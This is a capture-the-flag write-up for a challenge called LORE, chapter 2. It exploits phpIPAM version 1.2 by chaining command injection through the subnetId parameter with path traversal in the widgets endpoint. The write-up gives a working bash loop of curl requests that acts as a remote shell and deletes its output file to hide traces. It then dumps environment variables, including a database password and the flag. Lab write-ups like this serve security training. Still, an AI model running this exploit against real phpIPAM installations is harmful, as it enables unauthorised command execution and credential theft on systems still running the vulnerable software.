# Chapter 2: Origins (4 points)

Hi, TCC-CSIRT analyst,

do you know the feeling when, after a demanding shift, you fall into lucid
dreaming and even in your sleep, you encounter tricky problems? Help a
colleague solve tasks in the complex and interconnected world of LORE, where it
is challenging to distinguish reality from fantasy.

* The entry point to LORE is at http://intro.lore.tcc.

See you in the next incident!

## Hints

* Be sure you enter flag for correct chapter.

## Solution

```text
2 Origins

An ink on blue,
Revealing sources of olden days,
Very silent whisper.

Not assigned, but findable,
The passage for anyone,
Shall ease the mind.
```

After opening the link for the second chapter, we can see a login form of
`phpIPAM IP address management [v1.2]`. We can download the [source code] of
this version for further exploration.

We can see that there are quite a few places where `exec()` method is being
called.

```console
$ grep -r "exec(" phpipam
phpipam/api/v1/functions/functions-common.php:  $ver = shell_exec("grep 'Project-Id-Version:' ".dirname(__FILE__)."/locale/$code/LC_MESSAGES/phpipam.po");
phpipam/api/v1/functions/functions-network.php:     exec($cmd, $output, $retval);
phpipam/api/v1/_examples/apiClient.php:      $result = curl_exec($ch);
phpipam/app/admin/import-export/generate-mysql.php:$content .= shell_exec($command);
phpipam/app/admin/version-check/index.php:      $commit_log = shell_exec("git log");
phpipam/app/subnets/scan/subnet-scan-icmp.php:exec($cmd, $output, $retval);
phpipam/app/subnets/scan/subnet-scan-telnet.php:exec($cmd, $output, $retval);
phpipam/app/subnets/scan/subnet-update-icmp.php:exec($cmd, $output, $retval);
```

If we take a closer look at e.g. `app/subnets/scan/subnet-scan-telnet.php` we
can see that it performs only some basic `port` parameter checking, after which
it constructs a command string which it executes without any further checks.

```php
<?php

/*
 * Discover new hosts with telnet scan
 *******************************/

# get ports
if(strlen($_POST['port'])==0) 	{ $Result->show("danger", _('Please enter ports to scan').'!', true); }

//verify ports
$pcheck = explode(";", str_replace(",",";",$_POST['port']));
foreach($pcheck as $p) {
	if(!is_numeric($p)) {
		$Result->show("danger", _("Invalid port")." ($p)", true);
	}
}
$_POST['port'] = str_replace(";",",",$_POST['port']);


# invoke CLI with threading support
$cmd = $Scan->php_exec." ".dirname(__FILE__) . "/../../../functions/scan/subnet-scan-telnet-execute.php $_POST[subnetId] '$_POST[port]'";

# save result to $output
exec($cmd, $output, $retval);

# format result back to object
$script_result = json_decode($output[0]);
```

This implies that we can (ab)use the `subnetId` parameter to inject and execute
any command we want. The only downside is that we won't be able to see the
command output, as the script assumes that the output is JSON which it tries to parse and process further.

In addition to the script above, we can come across
`app/dashboard/widgets/index.php` which displays/renders any `.php` file on the server and is vulnerable to path traversal.

```php
<?php

# get filelist for all configured widgets


# include requested widget file
if(!file_exists(dirname(__FILE__)."/".$_GET['section'].".php"))		{ $_REQUEST['section']="404"; print "<div id='error'>"; include_once('app/error.php'); print "</div>"; }
else																{ include(dirname(__FILE__) . "/".$_GET['section'].".php"); }

?>
```

We can combine these two pieces of information and write a primitive shell that
will:
* abuse `subnet-scan-telnet.php` to execute a given command and store the
  output in `/tmp/myprecious.php`
* abuse `widgets` endpoint to retrieve and display the file with the command
  output
* abuse `subnet-scan-telnet.php` to execute a delete command to remove the file
  with the output, so no hints areleft on the server for other explorers
  :smiling_imp:

```shell
HOST=http://pimpam.lore.tcc
while read -p "${HOST}\$ " CMD; do
  curl -s -d "port=80" --data-urlencode "subnetId=1 80 || (${CMD}) >/tmp/myprecious.php 2>&1 || echo" "${HOST}/app/subnets/scan/subnet-scan-telnet.php" >/dev/null
  curl -s "${HOST}/app/dashboard/widgets/?section=..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fmyprecious" --output -
  curl -s -d "port=80" --data-urlencode "subnetId=1 80 || rm /tmp/myprecious.php || echo" "${HOST}/app/subnets/scan/subnet-scan-telnet.php" >/dev/null
done
```

Now that we can execute commands on the server, we can execute e.g. `printenv`
to print the environment variables of the runnung process.

```text
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT=tcp://192.168.128.1:443
PIMPAM_DB_SERVICE_PORT=3306
PIMPAM_DB_PORT=tcp://192.168.167.76:3306
PIMPAM_DB_PORT_3306_TCP=tcp://192.168.167.76:3306
HOSTNAME=pimpam-7b7c7f4c87-q8z9n
PIMPAM_WEB_SERVICE_HOST=192.168.200.130
OLDPWD=/
PIMPAM_DBPASS=2eb6a09ff7b8417c4344c8bde185a512
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
PIMPAM_WEB_PORT=tcp://192.168.200.130:80
PIMPAM_WEB_SERVICE_PORT=80
PIMPAM_DBHOST=pimpam-db
PIMPAM_WEB_SERVICE_PORT_WEB=80
PIMPAM_WEB_PORT_80_TCP_ADDR=192.168.200.130
KUBERNETES_PORT_443_TCP_ADDR=192.168.128.1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PIMPAM_WEB_PORT_80_TCP_PORT=80
PIMPAM_WEB_PORT_80_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_PORT=443
APACHE_LOCK_DIR=/var/lock/apache2
KUBERNETES_PORT_443_TCP_PROTO=tcp
LANG=C
PIMPAM_DBNAME=pimpam
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_SERVER_NAME=localhost
APACHE_LOG_DIR=/var/log/apache2
PIMPAM_WEB_PORT_80_TCP=tcp://192.168.200.130:80
PIMPAM_DB_PORT_3306_TCP_ADDR=192.168.167.76
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT_443_TCP=tcp://192.168.128.1:443
KUBERNETES_SERVICE_HOST=192.168.128.1
PIMPAM_DB_PORT_3306_TCP_PORT=3306
PWD=/var/www/html/app/subnets/scan
PIMPAM_DB_PORT_3306_TCP_PROTO=tcp
PIMPAM_DB_SERVICE_HOST=192.168.167.76
PIMPAM_DB_SERVICE_PORT_MYSQL=3306
FLAG=FLAG{V51j-9ETA-Swya-8cOR}
```

We can see and submit the flag now, however, this server and the ability to
run commands there will come handy in [Chapter 3: Bounded] and
[Chapter 4: Uncle].

[source code]: https://github.com/phpipam/phpipam/tree/v1.2.0
[Chapter 3: Bounded]: ../lore-3-bounded
[Chapter 4: Uncle]: ../lore-4-uncle
